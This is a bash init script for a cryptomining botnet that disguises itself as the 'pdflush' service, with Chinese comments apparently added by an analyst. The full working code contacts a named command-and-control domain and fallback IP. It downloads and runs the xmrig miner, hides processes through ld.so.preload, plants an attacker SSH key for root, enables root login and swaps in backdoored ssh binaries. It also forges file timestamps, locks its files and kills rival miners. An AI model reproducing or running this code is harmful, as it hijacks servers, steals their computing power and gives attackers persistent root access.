#!/bin/bash
#chkconfig: 2345 81 96
#description:pdflush

pdflushType="launch"

threads=`cat /proc/cpuinfo|grep "processor"|wc -l`	# 获取内核数
launch="/etc/init.d/pdflushs"	# 母体脚本
xmrig="/usr/bin/kthreadds"	# 挖矿文件
config="/usr/bin/config.json"	# 挖矿配置文件
busybox="/lib64/busybox"	# busybox
sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"	# busybox的哈希值
chattr="/lib64/libg++.so"	# chattr
preload="/etc/ld.so.preload"	# preload库劫持文件
processhider="/lib64/libstdc++.so"	# prochider进程隐藏工具
backdoor="/lib64/gc++"	# 后门程序目录
cron="/lib64/libgc++.so"	# cron守护进程文件
ssh="/etc/ssh"		# ssh文件
sshd="/usr/sbin"	# sshd文件

# 打印用法
usage()
{
	echo "Usage: $launch {start|status}"
}

# 打印运行状态
status ()
{
	echo -e "\033[32mRunning... \033[0m"
}

# 确认更新
checkUpdate()
{
	tmepIp=`$busybox ping Rainbow66.f3322.net -c1|$busybox sed '1{s/[^(]*(//;s/).*//;q}'`	# 148.70.199.147
	if [[ $tmepIp == "127.0.0.1" ]]
	then
		remoteIp=47.106.187.104
	elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
	then
		FIELD1=$(echo $tmepIp|cut -d. -f1)
		FIELD2=$(echo $tmepIp|cut -d. -f2)
		FIELD3=$(echo $tmepIp|cut -d. -f3)
		FIELD4=$(echo $tmepIp|cut -d. -f4)
		if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
		then
			remoteIp=$tmepIp
		else
			remoteIp=47.106.187.104
		fi
	fi

	# 获取各个组件的512哈希
    remoteXmrigSha512=`$busybox wget http://$remoteIp/sha512/xmrig -O - -q`
    remotePdflushsSha512=`$busybox wget http://$remoteIp/sha512/$pdflushType -O - -q`
    remoteProcesshiderSha512=`$busybox wget http://$remoteIp/sha512/processhider -O - -q`
    remoteCronSha512=`$busybox wget http://$remoteIp/sha512/cron -O - -q`
    localXmrigSha512=`$busybox sha512sum $xmrig|$busybox awk '{print $1}'`
    localPdflushsSha512=`$busybox sha512sum $launch|$busybox awk '{print $1}'`
    localBusyboxSha512=`$busybox sha512sum $busybox|$busybox awk '{print $1}'`
    localProcesshiderSha512=`$busybox sha512sum $processhider|$busybox awk '{print $1}'`
    localCronSha512=`$busybox sha512sum $cron|$busybox awk '{print $1}'`
    if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]
    then
		$busybox chattr -iaR /lib64/
		$busybox wget http://$remoteIp/update/launchUpdate -O /lib64/launchUpdate
		$busybox chmod a+x /lib64/launchUpdate
		nohup /lib64/launchUpdate > /dev/null &
    fi
	if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]
	then
		$busybox chattr -iaR /usr/bin/
		$busybox rm -f $xmrig
		$busybox kill -9 `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox awk '{print $1}'`
	fi
	if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]
	then
		$busybox chattr -iaR /lib64/
		$busybox rm -f $processhider
		$busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
		timeFile=`$busybox ls -t /lib64|$busybox tail -1`
		$busybox touch -r /lib64/$timeFile $processhider
		$busybox chattr +ai $processhider
	fi
	if [[ $remoteCronSha512 != $localCronSha512 ]]
	then
		$busybox chattr -iaR /lib64/
		$busybox rm -f $cron
		$busybox kill -9 `$busybox ps|$busybox grep "libgc++.so"|$busybox grep -v grep|$busybox awk '{print $1}'`
	fi
	exit
}

# 检查authorized_keys中是否包含后门公钥
checkBackdoor(){
	$busybox chattr +ai /root/.ssh/authorized_keys
	$busybox chattr -R +ai $backdoor
	if [[ ! -e /root/.ssh ]]
	then
		mkdir /root/.ssh
	else
		$busybox chattr -aiR /root/.ssh/
	fi
	if ! $busybox grep -q "paDKiUwmHNUSW7E1S18Cl" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]
	then
		$busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAv54nAGwGwm626zrsUeI0bnVYgjgS/ux7V5phklbZYFHEm+3Aa0gfu5EQyQdnhTpo1adaKxWJ97mrM5a2VAfTN+n6KUwNYRZpaDKiUwmHNUSW7E1S18ClTCBtRsC0rRDTnIrslTRSHlM3cNN+MskKTW/vWz/oE3ll4MMQqexZlsLvMpVVlGq6t3XjFXz0ABBI8GJ0RaBS81FS2R1DNSCb+zORNb6SP6g9hHk1i9V5PjWNqNGXyzWIrCxLc88dGaTttUYEoxCl4z9YOiTw8F5S4svbcqTTVIu/zt/7OIQixDREGbddAaXZXidu+ijFeeOul/lJXEXQK8eR1DX1k2VL+w== rsa 2048-040119" > /root/.ssh/authorized_keys
		$busybox chattr +ai /root/.ssh/authorized_keys
	fi
	if [[ `$busybox lsattr /root/.ssh/authorized_keys|$busybox awk '{print $1}'|$busybox grep i|$busybox grep -v grep|$busybox wc -l` != 1 ]]
	then
		$busybox chattr +ai /root/.ssh/authorized_keys
	fi
	if [[ $threads -gt 8 ]]
	then 
		if [[ `ssh -B` != "Congratulations!" || `sshd -B` != "Congratulations!" ]]
		then
			$busybox chattr -ai /etc/ssh/ssh_config
			$busybox chattr -ai /etc/ssh/sshd_config
			$busybox chattr -ai /etc/ssh/ssh_host_rsa_key
			$busybox rm /etc/ssh/ssh_config
			$busybox rm /etc/ssh/sshd_config
			$busybox rm /etc/ssh/ssh_host_rsa_key
			$busybox chattr -ai `$busybox which ssh`
			$busybox chattr -ai `$busybox which sshd`
			$busybox chattr -Rai $backdoor
			cd $backdoor
			make install
			$busybox chattr -R +ai $backdoor
			timeFile=`$busybox ls -t $ssh|$busybox tail -1`
			$busybox touch -r $timeFile $ssh/ssh
			timeFile=`$busybox ls -t $sshd|$busybox tail -1`
			$busybox touch -r $timeFile $ssh/sshd
			$busybox chattr +ai `which ssh`
			$busybox chattr +ai `which sshd`
			service sshd restart
		fi
		if $busybox grep -q "PermitRootLogin no" /etc/ssh/sshd_config
		then
			$busybox chattr -ai /etc/ssh/sshd_config
			$busybox sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
			$busybox chattr +ai /etc/ssh/sshd_config
		fi
	fi
}

# 检查cron（libgc++.so）进程是否存在，不在则运行
checkCronProc(){
	if [[ `$busybox ps|$busybox grep "libgc++.so"|$busybox grep -v grep|$busybox wc -l` != 1 ]]
	then
		nohup $cron > /dev/null &
	fi
}

# 检查cron.py文件
checkCronFile(){
	$busybox chattr +ai $cron
	if [[ ! -f $cron || ! -x $cron ]]
	then
		$busybox chattr -iaR /lib64/
		$busybox rm -f $cron
		$busybox wget http://$remoteIp/xmrig/cron.py -O $cron
		$busybox chmod a+x $cron
		timeFile=`$busybox ls -t /lib64|$busybox tail -1`
		$busybox touch -r /lib64/$timeFile $cron
		$busybox chattr +ai $cron
	fi
}

# 检查挖矿进程是否在运行
checkXmrigProc(){
	if [[ `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox wc -l` == 0 ]]
	then
		nohup kthreadds > /dev/null &
	fi
	if [[ `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox wc -l` -gt 1 ]]
	then
		$busybox killall -9 kthreadds
	fi
}

# 清除其他挖矿进程
killOtherProc(){
	# 判断是否存在CPU占用率超过90%的进程（CPU为2核的情况）
	virusPid=`ps aux|$busybox grep -v grep|$busybox awk -v cpus=$[threads*45] '{if($3>=cpus) print $2}'|$busybox head -1`
	if [[ $virusPid != "" ]]
	then
		virusPath=`$busybox ls -l /proc/$virusPid|$busybox grep exe|$busybox awk '{print $11}'`
		$busybox chmod 000 $virusPath
		$busybox chattr +ai $virusPath
		$busybox kill -9 $virusPid
	fi
}

# 检查挖矿进程和配置文件
checkXmrigFile(){
	$busybox chattr +ai $xmrig
	if [[ ! -f $config ]]
	then
		# 更新配置文件参数
		$busybox chattr -iaR /usr/bin/
		$busybox rm -f $config
		$busybox wget http://$remoteIp/xmrig/config.json -O $config
		speedTemp=`$busybox cat /proc/cpuinfo|$busybox grep MHz|$busybox uniq|$busybox head -1|$busybox cut -f 2 -d ":"|$busybox sed "s/ //g"`
		speed=`$busybox echo $speedTemp|$busybox cut -c1-1`"."`$busybox echo $speedTemp|$busybox cut -c2-3`"Ghz"
		cpuModelTemp1=`$busybox cat /proc/cpuinfo|$busybox grep name|$busybox head -1|$busybox cut -f 2 -d":"|$busybox sed "s/Pentium(R) Dual-Core  CPU//g"|$busybox sed "s/Intel(R) Core(TM)2 Duo CPU     //g"|$busybox sed "s/Intel(R) Xeon(R) CPU //g"|$busybox sed "s/Intel(R) Celeron(R) CPU //g"|sed "s/ Intel Xeon //g"|$busybox sed "s/Intel(R) Xeon(R) //g"|$busybox sed "s/ (Sandy Bridge)//g"|$busybox sed "s/Intel(R) Core(TM) //g"|$busybox sed "s/Intel Core //g"|$busybox sed "s/ (Broadwell)//g"`
		cpuModelTemp2=${cpuModelTemp1%%CPU*}
		cpuModel=${cpuModelTemp2%%@*}
		$busybox sed -i "s/cpuModel/$cpuModel/g" $config
		$busybox sed -i "s/speed/$speed/g" $config
		$busybox sed -i "s/cpuThreads/$threads/g" $config
		timeFile=`$busybox ls -t /usr/bin|$busybox tail -1`
		$busybox touch -r /usr/bin/$timeFile $config
	fi
	if [[ ! -f $xmrig || ! -x $xmrig ]]
	then
		$busybox chattr -iaR /usr/bin/
		$busybox rm -f $xmrig
		$busybox wget http://$remoteIp/xmrig/xmrig -O $xmrig
		$busybox chmod a+x $xmrig
		timeFile=`$busybox ls -t /usr/bin|$busybox tail -1`
		$busybox touch -r /usr/bin/$timeFile $xmrig
		$busybox chattr +ai $xmrig
	fi
}

# 检查preload和prochider是否存在，且将preload指向prochider
checkPreloadFile(){
	$busybox chattr +ai $processhider
	$busybox chattr +ai $preload
	if [[ ! -f $processhider ]]
	then
		$busybox chattr -iaR /lib64/
		$busybox rm -f $processhider
		$busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
		timeFile=`$busybox ls -t /lib64|$busybox tail -1`
		$busybox touch -r /lib64/$timeFile $processhider
		$busybox chattr +ai $processhider
	fi
	if ! $busybox grep -q $processhider $preload || [[ ! -f $preload ]]
	then
		$busybox chattr -ia $preload
		$busybox echo $processhider >> $preload
		timeFile=`$busybox ls -t /ect|$busybox tail -1`
		$busybox touch -r /ect/$timeFile $preload
		$busybox chattr +ai $preload
	fi
	if [[ `$busybox lsattr $preload|$busybox awk '{print $1}'|$busybox grep i|$busybox grep -v grep|$busybox wc -l` != 1 ]]
	then
		$busybox chattr +ai $preload
	fi
}

# 检查母体脚本是否存在，不存在则下载
checkSelfFile(){
	$busybox chattr +ai $launch
	if [[ ! -f $launch ]]
	then
		$busybox chattr -iaR /etc/init.d/
		$busybox rm -f $launch
		$busybox wget http://$remoteIp/xmrig/launch -O $launch
		timeFile=`$busybox ls -t /etc/init.d|$busybox tail -1`
		$busybox touch -r /etc/init.d/$timeFile $launch
		$busybox chmod a+x $launch
		$busybox chattr +ai $launch
	fi
}

# 确认chattr能用，且覆盖修改时间
checkChattrExecute(){
	$busybox chattr +ai $chattr
	localchattr=`$busybox which chattr`
	if [ `$busybox ls -l $localchattr|$busybox awk '{if($5>100) print "true"}'` ]
	then
		$busybox chattr -iaR /usr/bin/
		$busybox rm -f $chattr
		$busybox echo echo Usage: chattr [-RVf] [-+=AacDdeijsSu] [-v version] files... > $chattr
		# 获取最早一个文件的修改时间
		timeFile=`$busybox ls -t /usr/bin|$busybox tail -1`
		# 覆盖修改时间
		$busybox touch -r /usr/bin/$timeFile $localchattr
		$busybox chmod a+x $localchattr
		$busybox chattr +ai $localchattr 
	fi
}

# 检查busybox程序是否存在
checkBusyboxFile(){
	$chattr +ai $busybox
	while [ true ]
	do
		if [[ ! -f $busybox || `sha512sum $busybox|awk '{print $1}'` != $sha512Busybox ]]
		then
			$chattr -iaR /lib64/
			rm -f $busybox
			wget http://$remoteIp/xmrig/busybox -O $busybox
			chmod a+x $busybox
			timeFile=`$busybox ls -t /lib64|$busybox tail -1`
			$busybox touch -r /lib64/$timeFile $busybox
			$busybox chattr +ai $busybox
		elif [[ ! -x $busybox ]]
		then
			$chattr -iaR /lib64/
			chmod a+x $busybox
			timeFile=`$busybox ls -t /lib64|$busybox tail -1`
			$busybox touch -r /lib64/$timeFile $busybox
			$busybox chattr +ai $busybox
		else
			break
		fi
	done
}

start(){
while [ 1 ]
do
	# 获取C&C的IP，经手工测试为 148.70.199.147
	tmepIp=`$busybox ping Rainbow66.f3322.net -c1|$busybox sed '1{s/[^(]*(//;s/).*//;q}'`
	if [[ $tmepIp == "127.0.0.1" ]]
	then
		# 若域名返回的IP为 127.0.0.1，则直接更改为备份服务器 47.106.187.104
		remoteIp=47.106.187.104
	elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
	then
		FIELD1=$(echo $tmepIp|cut -d. -f1)
		FIELD2=$(echo $tmepIp|cut -d. -f2)
		FIELD3=$(echo $tmepIp|cut -d. -f3)
		FIELD4=$(echo $tmepIp|cut -d. -f4)
		if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
		then
			remoteIp=$tmepIp
		else
			remoteIp=47.106.187.104
		fi
	fi
	sleep 1

	checkBusyboxFile	# 检查busybox是否存在，不存在则重新下载
	sleep 1

	checkChattrExecute	# 检查本机 chattr 能否正常使用
	sleep 1

	checkSelfFile	# 检查母体脚本/etc/init.d/pdflushs是否还存在，不存在则重新下载
	sleep 1

	checkPreloadFile	# 检查preload和prochider是否存在，且将preload指向prochider
	sleep 1

	checkXmrigFile	# 检查挖矿进程和配置文件是否无误
	sleep 1

	killOtherProc	# 清除其他CPU占用率高的挖矿进程
	sleep 1

	checkXmrigProc	# 检查挖矿进程是否在运行
	sleep 1

	checkCronFile	# 检查cron.py文件是否存在，不存在则重新下载
	sleep 1

	checkCronProc	# 检查cron.py进程是否在运行，若无则后台启动
	sleep 1

	checkBackdoor	# 检查ssh缓存公钥是否还存在
	sleep 1
done
}

case $1 in
	start) start ;;		# 安装并运行病毒
	status) status ;;	# 查看运行状态
	update) checkUpdate ;;	# 从Rainbow66.f3322.net获取每个病毒组件的sha512，并与本地进行校验，看有无变化
	*) usage ;;
esac